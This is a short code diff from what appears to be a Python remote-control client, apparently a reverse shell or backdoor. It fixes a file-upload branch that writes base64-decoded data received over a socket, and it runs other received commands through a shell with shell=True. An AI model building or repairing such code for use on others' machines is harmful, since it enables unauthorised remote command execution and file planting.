@@ -25,7 +25,7 @@ while True:
             file = client_socket.recv(1024)
             list_command = command.split(' ')
             with open(list_command[1], "wb") as file_open:
-                file_open.write(base64.b64decode(list_command[2]))
+                file_open.write(base64.b64decode(file))
 
         else:
             ex = subprocess.check_output(command, shell=True).decode()
